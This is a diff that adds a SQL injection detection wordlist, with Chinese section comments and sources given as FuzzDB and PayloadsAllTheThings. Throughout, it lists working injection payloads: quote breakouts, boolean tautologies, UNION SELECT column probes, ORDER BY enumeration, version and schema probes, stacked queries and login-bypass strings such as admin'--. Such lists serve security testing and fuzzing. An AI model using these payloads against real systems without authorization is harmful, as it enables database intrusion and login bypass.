@@ -1,0 +1,214 @@
+# SQL Injection Detection Payloads
+# 来源: FuzzDB xplatform.txt, PayloadsAllTheThings
+# 跨平台SQL注入检测payload
+
+# === 基础检测 ===
+'
+"
+`
+')
+")
+`)
+'))
+"))
+`))
+;
+'--
+"--
+`--
+')--
+")--
+`)--
+'))--
+"))--
+`))--
+'#
+"#
+`#
+')#
+")#
+`)#
+'))#
+"))#
+`))#
+'/*
+"/*
+`/*
+')/*
+")/*
+`)/*
+'))/*
+"))/*
+`))/*
+
+# === 布尔检测 ===
+' AND '1'='1
+' AND '1'='2
+" AND "1"="1
+" AND "1"="2
+' AND 1=1--
+' AND 1=2--
+" AND 1=1--
+" AND 1=2--
+') AND ('1'='1
+') AND ('1'='2
+") AND ("1"="1
+") AND ("1"="2
+' OR '1'='1
+' OR '1'='2
+" OR "1"="1
+" OR "1"="2
+' OR 1=1--
+' OR 1=2--
+" OR 1=1--
+" OR 1=2--
+1 AND 1=1
+1 AND 1=2
+1 OR 1=1
+1 OR 1=2
+-1 OR 1=1
+-1 OR 1=2
+
+# === 数学运算检测 ===
+1-false
+1-true
+1*56
+1/1
+1/0
+1%1
+1%0
+1+1
+1-1
+1*1
+1/1
+1 AND true
+1 AND false
+1-0
+1-1
+1*1
+1*0
+
+# === 字符串检测 ===
+' False
+'' True
+" False
+"" True
+\ False
+\\ True
+'||'
+"||"
+'+'
+"+"
+' '
+" "
+
+# === 特殊字符检测 ===
+<>"'%;)(&+
+|
+!
+?
+/
+//
+//*
+&
+*|
+*/*
+||6
+'||'6
+(||6)
+%7C
+'||(elt(-3+5,bin(15),ord(10),hex(char(45))))
+
+# === 注释检测 ===
+/**/
+--
+#
+;--
+;#
+;/*
+'/**/
+"/**/
+')/**/
+")/**/
+
+# === 编码检测 ===
+%27
+%22
+%60
+%27%27
+%22%22
+%27--%20
+%22--%20
+%27%23
+%22%23
+
+# === UNION检测 ===
+' UNION SELECT NULL--
+" UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+" UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--
+" UNION SELECT NULL,NULL,NULL--
+' UNION ALL SELECT NULL--
+" UNION ALL SELECT NULL--
+' UNION ALL SELECT NULL,NULL--
+" UNION ALL SELECT NULL,NULL--
+' UNION ALL SELECT NULL,NULL,NULL--
+" UNION ALL SELECT NULL,NULL,NULL--
+\x27UNION SELECT
+' UNION SELECT
+" UNION SELECT
+' UNION ALL SELECT
+" UNION ALL SELECT
+
+# === ORDER BY检测 ===
+' ORDER BY 1--
+" ORDER BY 1--
+' ORDER BY 2--
+" ORDER BY 2--
+' ORDER BY 3--
+" ORDER BY 3--
+' ORDER BY 10--
+" ORDER BY 10--
+' ORDER BY 100--
+" ORDER BY 100--
+' GROUP BY 1--
+" GROUP BY 1--
+
+# === 函数检测 ===
+' AND ASCII(SUBSTRING(version(),1,1))>0--
+" AND ASCII(SUBSTRING(version(),1,1))>0--
+' AND LENGTH(version())>0--
+" AND LENGTH(version())>0--
+' AND (SELECT COUNT(*) FROM information_schema.tables)>0--
+" AND (SELECT COUNT(*) FROM information_schema.tables)>0--
+
+# === 堆叠查询检测 ===
+'; SELECT 1--
+"; SELECT 1--
+'; SELECT @@version--
+"; SELECT @@version--
+'; SELECT version()--
+"; SELECT version()--
+
+# === 特殊payload ===
+'\"
+admin'--
+admin"--
+admin')--
+admin")--
+admin' or '
+admin" or "
+' or 0=0 --
+" or 0=0 --
+or 0=0 --
+' or 0=0 #
+" or 0=0 #
+or 0=0 #
+' or 'x'='x
+" or "x"="x
+') or ('x'='x
+") or ("x"="x
+' or 1 --'
+' or 1/*
+; or '1'='1'
